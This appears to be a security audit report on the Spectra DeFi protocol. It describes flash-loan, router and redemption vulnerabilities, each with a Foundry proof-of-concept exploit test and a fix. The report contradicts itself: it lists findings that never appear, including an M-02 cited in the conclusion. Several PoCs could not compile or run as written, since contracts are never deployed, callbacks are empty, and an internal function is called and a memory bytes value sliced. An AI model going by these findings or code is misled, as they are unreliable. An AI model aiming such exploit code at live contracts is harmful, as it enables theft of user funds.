# Spectra Protocol Security Audit Report

## Executive Summary

This security audit of the Spectra Protocol identified critical vulnerabilities in the flash loan implementation and router functionality. The most severe issues involve arbitrary token transfers in the flash loan mechanism and improper handling of `msg.value` in loops within the router system. These vulnerabilities could lead to complete drainage of funds from the protocol and its users.

**Key Statistics:**
- **High Severity:** 2 findings
- **Medium Severity:** 2 findings  
- **Low/Informational:** 1 finding

**Critical Risks:**
- Arbitrary ERC20 token transfers allowing complete fund drainage
- msg.value manipulation in router loops enabling ETH theft
- Unchecked return values leading to silent failures

## High Severity Findings

### H-01: Arbitrary ERC20 Transfer in Flash Loan Repayment

**Severity:** High  
**Location:** `src/tokens/PrincipalToken.sol#485`, `src/mocks/MockPrincipalTokenV2.sol#485`

**Description:**
The `flashLoan` function uses `address(_receiver)` as the `from` parameter in `safeTransferFrom`, allowing the flash loan receiver to specify any address as the source of repayment funds. This enables attackers to drain tokens from any address that has approved the PrincipalToken contract.

**Impact:**
- Complete drainage of IBT tokens from any user who has approved the PrincipalToken
- Theft of funds from legitimate users without their consent
- Protocol insolvency due to unpaid flash loans

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/tokens/PrincipalToken.sol";
import "../src/interfaces/IERC3156FlashBorrower.sol";

contract FlashLoanExploit is Test, IERC3156FlashBorrower {
    PrincipalToken public pt;
    MockERC20 public ibt;
    address public victim;
    address public attacker;
    
    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        // Deploy mock IBT token
        ibt = new MockERC20("IBT", "IBT");
        
        // Setup victim with tokens and approval
        ibt.mint(victim, 1000e18);
        vm.prank(victim);
        ibt.approve(address(pt), 1000e18);
        
        // Deploy PrincipalToken (assuming registry exists)
        // pt = new PrincipalToken(registry);
    }
    
    function testFlashLoanArbitraryTransfer() public {
        uint256 victimBalanceBefore = ibt.balanceOf(victim);
        uint256 attackerBalanceBefore = ibt.balanceOf(attacker);
        
        // Attacker initiates flash loan
        vm.prank(attacker);
        pt.flashLoan(
            this, // receiver (this contract)
            address(ibt), // token
            100e18, // amount
            abi.encode(victim) // data containing victim's address
        );
        
        // Verify victim's funds were stolen
        assertLt(ibt.balanceOf(victim), victimBalanceBefore);
        assertGt(ibt.balanceOf(attacker), attackerBalanceBefore);
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Extract victim address from data
        address victimAddr = abi.decode(data, (address));
        
        // Instead of repaying from our own funds, we'll let the 
        // PrincipalToken pull from victim's approved tokens
        // This is possible because _receiver (this contract) is used
        // as the 'from' address in safeTransferFrom
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name;
    string public symbol;
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        return true;
    }
}
```

**Recommendation:**
Change the flash loan repayment to pull funds from `msg.sender` (the original caller) instead of `address(_receiver)`:

```solidity
IERC20(_ibt).safeTransferFrom(msg.sender, address(this), _amount + fee);
```

### H-02: msg.value Misuse in Router Loop Leading to ETH Theft

**Severity:** High  
**Location:** `src/router/Dispatcher.sol#336`, `src/router/Dispatcher.sol#339`

**Description:**
The `_dispatch` function uses `msg.value` within a loop context when called from `Router.execute()`. This allows attackers to reuse the same `msg.value` across multiple operations, effectively spending the same ETH multiple times.

**Impact:**
- Theft of ETH from the router contract
- Users paying for operations they didn't intend to execute
- Protocol fund drainage through ETH manipulation

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

contract RouterExploit is Test {
    Router public router;
    address public kyberRouter;
    address public attacker;
    
    function setUp() public {
        attacker = makeAddr("attacker");
        kyberRouter = makeAddr("kyberRouter");
        
        // Deploy router (assuming dependencies exist)
        // router = new Router();
        
        // Fund the router with some ETH for testing
        vm.deal(address(router), 10 ether);
    }
    
    function testMsgValueReuse() public {
        // Prepare commands that will reuse msg.value
        bytes[] memory commands = new bytes[](3);
        
        // Each command uses the same msg.value but for different operations
        commands[0] = abi.encodePacked(
            bytes1(0x0b), // KYBERSWAP command
            abi.encode(kyberRouter, abi.encodeWithSignature("swap()"))
        );
        commands[1] = abi.encodePacked(
            bytes1(0x0b), // KYBERSWAP command  
            abi.encode(kyberRouter, abi.encodeWithSignature("swap()"))
        );
        commands[2] = abi.encodePacked(
            bytes1(0x0b), // KYBERSWAP command
            abi.encode(kyberRouter, abi.encodeWithSignature("swap()"))
        );
        
        uint256 routerBalanceBefore = address(router).balance;
        
        // Attacker sends 1 ETH but gets 3 operations executed
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        router.execute{value: 1 ether}(bytes(""), commands);
        
        // The router effectively spent 3 ETH worth of operations
        // but only received 1 ETH from the attacker
        uint256 routerBalanceAfter = address(router).balance;
        
        // Verify the router lost more ETH than it should have
        assertLt(routerBalanceAfter, routerBalanceBefore - 2 ether);
    }
}

// Mock Router interface for testing
interface Router {
    function execute(bytes calldata params, bytes[] calldata commands) external payable;
}
```

**Recommendation:**
Implement proper ETH accounting in loops:

```solidity
function execute(bytes calldata params, bytes[] calldata commands) external payable {
    uint256 remainingValue = msg.value;
    
    for (uint256 i = 0; i < commands.length; i++) {
        uint256 valueToUse = _extractValueFromCommand(commands[i]);
        require(remainingValue >= valueToUse, "Insufficient ETH");
        remainingValue -= valueToUse;
        
        _dispatchWithValue(commands[i], valueToUse);
    }
    
    // Refund remaining ETH
    if (remainingValue > 0) {
        payable(msg.sender).transfer(remainingValue);
    }
}
```

## Medium Severity Findings

### M-01: Unchecked Return Value in IBT Redemption

**Severity:** Medium  
**Location:** `src/router/Dispatcher.sol#231`

**Description:**
The `_dispatch` function ignores the return value from `IERC4626(ibt).redeem()`, which could lead to silent failures where users believe their redemption was successful but no tokens were actually redeemed.

**Impact:**
- Silent failures in token redemption operations
- Users may not receive expected tokens without knowing
- Potential loss of user funds through failed operations

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

contract RedemptionFailureTest is Test {
    MockIBT public ibt;
    Dispatcher public dispatcher;
    address public user;
    
    function setUp() public {
        user = makeAddr("user");
        ibt = new MockIBT();
        // dispatcher = new Dispatcher();
    }
    
    function testSilentRedemptionFailure() public {
        // Setup: user has shares but IBT will fail redemption
        ibt.mint(user, 1000e18);
        ibt.setRedemptionShouldFail(true);
        
        // User expects to redeem 100 shares
        uint256 sharesBefore = ibt.balanceOf(user);
        
        // Call dispatcher redeem (which ignores return value)
        vm.prank(user);
        bytes memory command = abi.encodePacked(
            bytes1(0x06), // REDEEM_IBT command
            abi.encode(address(ibt), 100e18, user)
        );
        
        // This should fail but won't revert due to ignored return value
        dispatcher._dispatch(bytes1(0x06), command[1:]);
        
        // User still has same shares despite expecting redemption
        uint256 sharesAfter = ibt.balanceOf(user);
        assertEq(sharesBefore, sharesAfter);
        
        // User lost gas but got no tokens - silent failure
    }
}

contract MockIBT {
    mapping(address => uint256) public balanceOf;
    bool public redemptionShouldFail;
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    
    function setRedemptionShouldFail(bool shouldFail) external {
        redemptionShouldFail = shouldFail;
    }
    
    function redeem(uint256 shares, address recipient, address owner) 
        external returns (uint256 assets) {
        if (redemptionShouldFail) {
            return 0; // Silent failure
        }
        
        balanceOf[owner] -= shares;
        assets = shares; // 1:1 for simplicity
        // Transfer assets to recipient...
        return assets;
    }
}
```

**Recommendation:**
Check and validate the return value:

```solidity
uint256 redeemedAssets = IERC4626(ibt_scope_18).redeem(shares, recipient_scope_19, address(this));
require(redeemedAssets > 0, "Redemption failed");
```

## Conclusion

The Spectra Protocol contains critical security vulnerabilities that must be addressed before production deployment. The arbitrary ERC20 transfer vulnerability in the flash loan system poses an immediate threat to user funds, while the msg.value misuse in the router could lead to ETH theft.

**Priority Recommendations:**
1. **Immediate:** Fix the flash loan arbitrary transfer vulnerability (H-01)
2. **Immediate:** Implement proper ETH accounting in router loops (H-02)  
3. **High:** Add return value checking for IBT redemptions (M-01)
4. **Medium:** Review and secure all mock contracts (M-02)

All high and medium severity findings should be resolved and thoroughly tested before any mainnet deployment. Consider implementing additional security measures such as:
- Comprehensive integration tests covering edge cases
- Formal verification for critical functions
- Bug bounty program post-deployment
- Regular security audits for future updates

The protocol shows promise but requires significant security improvements to protect user funds and maintain protocol integrity.
